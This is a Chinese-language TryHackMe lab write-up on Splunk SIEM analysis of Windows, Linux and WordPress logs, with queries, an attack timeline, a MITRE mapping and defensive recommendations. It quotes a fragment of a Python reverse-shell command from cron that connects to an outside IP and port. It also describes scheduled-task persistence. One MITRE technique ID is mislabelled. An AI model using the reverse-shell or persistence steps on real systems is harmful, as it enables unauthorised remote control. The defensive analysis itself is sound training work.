# TryHackMe Lab Report： Log Analysis with SIEM

## 核心主題：Windows、Linux 與 Web 多維度日誌分析與 SOC 調查思路練習

---

## 1. 執行摘要
本報告整理 TryHackMe「Log Analysis with SIEM」Lab 的練習過程，目標是透過 Splunk 查詢 Windows、Linux 與 Web 伺服器日誌，練習從不同來源的事件紀錄中找出可疑行為，並建立初步的 SOC 調查思路。

在 Lab 情境中，我分別分析了 Windows 端點的可疑外連與排程工作、Linux 系統中的 SSH 登入異常與 CRON 可疑任務，以及 Web 伺服器中針對 WordPress 登入頁面的高頻率請求。透過這次練習，我熟悉了 Splunk 基礎查詢、跨來源日誌觀察、事件關聯分析、MITRE ATT&CK 對應，以及初步改善建議的整理方式。

---

## 2. 分析目標
* **多源日誌整合檢索：** 練習使用 Splunk 統一查詢 Windows Sysmon、Linux auth/syslog 與 Apache Access Logs。
* **異常行為特徵定位：** 練習透過 Event ID、關鍵字與統計查詢語法，定位異常事件與威脅特徵。
* **攻擊階段脈絡梳理：** 整理包含可疑外連、暴力破解、特權提升、排程持久化與 Web 登入異常等行為。
* **防禦思維建立：** 依據 Lab 模擬情境進行初步風險判斷，並推導對應的防護改善建議。

---

## 3. 技術分析過程

### 3.1 Windows 端點可疑外連與排程工作分析
* **分析資料來源：** Windows WinEventLogs 與 Sysmon Logs（`index=task4`）
* **觀察重點與分析思路：**
  1. **外部異常連線定位：** 在 Windows 端點調查中，Lab 提示 `WIN-105` 主機出現非標準連接埠 `5678` 的外部連線。因此我先使用 **Sysmon Event ID 3（Network Connection）** 篩選該主機與目標連接埠的紀錄。
     * **使用的查詢語法：**
       ```splunk
       index=task4 ComputerName=WIN-105 EventCode=3 DestinationPort=5678
       ```
     * **查詢結果：** 觀察到發起連線的可疑程式路徑為 `C:\Windows\Temp\SharePoInt.exe`。
  2. **製程建立與 Hash 擷取：** 接著，我轉換思路透過 **Sysmon Event ID 1（Process Creation）** 搜尋該程式名稱，嘗試找出它的執行紀錄、Command Line 與雜湊值。
     * **使用的查詢語法：**
       ```splunk
       index=task4 EventCode=1 "SharePoInt.exe"
       ```
  3. **持久化機制識別：** 在檢視連續事件中，觀察到疑似使用 `schtasks.exe` 建立排程工作的紀錄。在 `CommandLine` 欄位中，發現其建立了排程名稱為 **`Office365 Install`** 的任務。在 Lab 情境中，這可能代表攻擊者嘗試透過 Windows 排程工作維持執行能力（Persistence）。
* **初步風險判斷：** 若在真實環境中觀察到位於 `C:\Windows\Temp\` 的未知執行檔向外部非標準 Port 建立連線，並伴隨 `schtasks.exe` 建立排程工作，應優先檢查該檔案來源、Hash、執行帳號、排程內容與外連目的 IP，確認是否為惡意程式或未授權行為。
![螢幕擷取畫面 2026-06-15 150139](https://hackmd.io/_uploads/HyNh1V6bGx.png)


### 3.2 Linux SSH 登入異常與 CRON 可疑任務分析
* **分析資料來源：** Linux `auth.log` 與 `syslog`（`index=task5`）
* **觀察重點與分析思路：**
  1. **帳號異動審計：** 在 Linux 日誌分析中，我先針對可疑帳號 `remote-ssh` 進行搜尋，觀察是否有新增帳號、登入或權限變更相關紀錄。
     * **使用的查詢語法：** `index=task5 "remote-ssh"`
  2. **特權提升調查：** 透過 `"su:"` 關鍵字檢查是否有使用者切換身份的紀錄。日誌中可以觀察到一般使用者 `ubuntu` 成功開啟 root session 的紀錄（`session opened for user root by ubuntu`），顯示在 Lab 情境中，該帳號可能被用作跳板以取得較高權限。
     * **使用的查詢語法：** `index=task5 "su:"`
  3. **追溯暴破源頭：** 為了追溯登入來源與攻擊頻率，我接著搜尋 SSH 登入成功與失敗紀錄：
     * **使用的查詢語法：**
       ```splunk
       index=task5 "Accepted password"
       index=task5 "Failed password"
       ```
     * **查詢結果：** 從紀錄中觀察到該帳號在成功登入前曾出現多次失敗嘗試，因此在 Lab 情境中可初步判斷為疑似 **SSH 暴力破解成功**。
  4. **定時任務後門偵測：** 最後，我檢查與 cron 相關的系統日誌：`index=task5 "cron"`。在結果中觀察到一段透過 Python 建立外部連線的單行指令，其中包含：`s.connect(("10.10.33.31", 7654))`。這類指令在 Lab 情境中具有**反向連線（Reverse Shell）**的特徵，可能被用於維持存取或建立遠端控制通道。
* **初步風險判斷：** 若在真實環境中觀察到 SSH 多次登入失敗後成功登入、一般使用者切換為 root，以及 CRON 中出現不明 Python 外連指令，應進一步檢查帳號是否遭盜用、CRON 任務內容、來源 IP、執行時間與外連目的地，並評估是否需要隔離主機與重設憑證。
![螢幕擷取畫面 2026-06-15 154105](https://hackmd.io/_uploads/SJ9ZlNTbzl.png)



### 3.3 Web 應用程式登入異常分析
* **分析資料來源：** Apache Access Logs（`index=task6`）
* **觀察重點與分析思路：**
  1. **目標路徑統計：** 在 Web 日誌分析中，我觀察到短時間內有大量 HTTP `POST` 請求集中在 WordPress 登入頁面 `/wp-login.php`。這類行為可能代表有人嘗試對後台登入頁面進行高頻率密碼嘗試。
  2. **流量降噪與指紋識別：** 使用以下統計查詢語法整理來源 IP 與 User-Agent：
     * **使用的查詢語法：**
       ```splunk
       index=task6 method=POST uri_path="/wp-login.php" | stats count by clientip, useragent
       ```
     * **查詢結果：** 成功鎖定來源 IP 為 `10.10.243.134`，且其 User-Agent 欄位明確顯示為 **`WPScan v3.8.28`**。WPScan 是常見的 WordPress 安全掃描工具，在 Lab 情境中，這代表該來源可能正在對 WordPress 登入頁面進行自動化掃描或登入嘗試。
* **初步風險判斷：** 若在真實環境中觀察到單一 IP 對 `/wp-login.php` 發出大量 POST 請求，且 User-Agent 顯示為自動化掃描工具，應檢查是否有成功登入紀錄、異常帳號活動、管理後台變更紀錄，並評估是否需要封鎖來源 IP、啟用登入限制、MFA 或 WAF 規則。
![螢幕擷取畫面 2026-06-15 153808](https://hackmd.io/_uploads/HkqC1NTZMe.png)

---

## 4. 攻擊流程整理
依據 Lab 中觀察到的日誌線索，可以將可能的事件流程整理如下：
1. **邊界暴破：** Web 伺服器出現針對 WordPress 登入頁面的高頻率 `POST` 請求（WPScan 工具特徵）。
2. **初始侵入：** Linux SSH 服務出現多次登入失敗後成功登入的紀錄。
3. **特權提升：** Linux 一般使用者 `ubuntu` 成功透過 `su` 指令切換至 `root` 權限。
4. **持久化部署（Linux）：** Linux 系統中出現可疑 CRON 任務，內容包含 Python 反向 Shell 外連指令（連向 Port 7654）。
5. **持久化部署（Windows）：** Windows 主機中觀察到疑似透過 `schtasks.exe` 建立名為 `Office365 Install` 的排程工作。
6. **命令與控制（C2）：** Windows 主機 `WIN-105` 出現由暫存區變色龍檔案 `SharePoInt.exe` 發起的非標準 Port（5678）外連。

---

## 5. MITRE ATT&CK 對應練習
> **備註提示：** 以下對應為依據 Lab 情境進行的初步練習，實際企業事件仍需要搭配更多端點、網路、EDR 與威脅情資資料確認。

| 觀察行為 | 可能對應技術 | 說明 |
| :--- | :--- | :--- |
| 對 `/wp-login.php` 進行大量 POST 登入嘗試 | [T1110.002] Brute Force: Password Guessing | Web Access Log 中出現高頻率登入請求，且 User-Agent 顯示為 WPScan。 |
| SSH 多次登入失敗後成功登入 | [T1110.001] Brute Force: Password Guessing | Linux `auth.log` 中出現多次 Failed password 與後續 Accepted password。 |
| 一般使用者透過 `su` 切換至 root | [T1548] Abuse Elevation Control Mechanism | 在 Linux `auth.log` 中觀察到使用者成功開啟 root session 的紀錄。 |
| Windows 使用 `schtasks.exe` 建立排程工作 | [T1053.005] Scheduled Task/Job | 可能被用於定期執行可疑程式或維持執行能力。 |
| Linux CRON 中出現 Python 外連指令 | [T1053.003] Scheduled Task/Job | CRON 任務被用來週期性執行外連指令以維持持久化。 |
| `SharePoInt.exe` 向外部非標準 Port 連線 | [T1071] Application Layer Protocol | Sysmon Event ID 3 顯示位於 Temp 目錄之可疑程式建立外部連線。 |

---

## 6. 初步改善建議方向
> **防禦備忘：** 以下改善方向為依據 Lab 情境整理的初步建議，實際企業環境仍需依照資產重要性、現有工具、網路架構與內部流程進行調整。

### 6.1 登入與憑證安全
* 針對 SSH、WordPress 後台與其他對外服務啟用多因素驗證（MFA）。
* 強化密碼政策，避免弱密碼或重複使用密碼。
* 針對短時間內連續登入失敗事件建立即時告警規則。
* 限制管理後台與 SSH 的來源 IP 存取範圍（如加入白名單或 VPN 限制）。

### 6.2 帳號與權限管理
* 定期審計 Linux 使用者清單、sudo 權限與 root 登入紀錄。
* 檢查 Windows 排程工作（Scheduled Tasks）與高權限執行紀錄。
* 針對異常 `su` 提權、新增帳號、未知排程工作異動建立 SIEM 告警。
* 嚴格遵循最小權限原則，降低帳號被濫用後的影響範圍。

### 6.3 Web 與端點防護
* 針對 WordPress 登入頁面啟用登入速率限制（Rate Limiting）或部署 WAF 規則以過濾自動化工具特徵。
* 持續監控可疑 User-Agent、暴力破解來源 IP 或高頻率異常請求。
* 檢查並限制 Windows `Temp` 目錄中不明執行檔的執行權限與外連行為。
* 定期蒐集可疑檔案 Hash、外連 IP、執行路徑並與威脅情資（TI）平台比對。

### 6.4 SIEM 偵測規則優化
* **關聯規則一：** 建立「SSH 多次登入失敗後，隨後出現單筆成功登入」的複合告警規則。
* **關聯規則二：** 建立「Web 登入頁面短時間高頻率 POST 請求且 User-Agent 為非標準瀏覽器」的阻斷規則。
* **關聯規則三：** 建立「Windows 非標準 Port 外連伴隨可疑程式路徑（如 Temp 目錄）」的分析規則。
* **關聯規則四：** 建立「Windows 排程工作新增與 Linux CRON 異動」的變更監控規則。

---

## 7. 學習心得與反思
這次 Lab 讓我第一次比較完整地練習用 Splunk 從不同來源的日誌中找線索。相比單一主機的事件分析，跨來源日誌分析一開始更容易讓人不知道從哪裡開始，因為 Windows、Linux 和 Web 日誌的格式、欄位與關鍵字都不同。

**身為資安初學者，坦白說我一開始對許多系統指令並不熟，例如 Windows 的 `schtasks`、Linux 的 `cron`，以及 Python socket 連線語法。** 當我在日誌中看到這些內容時，往往感到有些吃力。但我明白不能只把它們當成標準答案草草帶過，而是需要強迫自己停下來，去理解它們在作業系統中原本的正常用途，以及為什麼在這次的情境中會顯得可疑。

這次練習也讓我深刻理解到，SIEM 的核心價值不只是搜尋單一關鍵字，而是將不同來源的事件「串聯」在一起。例如，單獨看到 Port 5678 的外部連線時，可能還不容易判斷其風險高低；但如果能結合 Sysmon Process Creation（Event ID 1）、可疑路徑 `C:\Windows\Temp\SharePoInt.exe` 與排程工作紀錄（Office365 Install），就能像拼圖一樣，清晰地還原出整體的攻擊脈絡。

透過這次 Lab，我學到 SOC 初步分析需要具備兩種能力：第一是熟悉查詢工具與統計語法，能快速縮小調查範圍、降低雜訊；第二是理解作業系統與 Web 服務的基本行為，才能準確判斷哪些事件不正常。接下來我希望繼續加強 Splunk 查詢、Linux 稽核日誌、Windows Sysmon 的實作，並培養將常見可疑行為整理成簡單偵測規則（如 Sigma Rule）的能力。
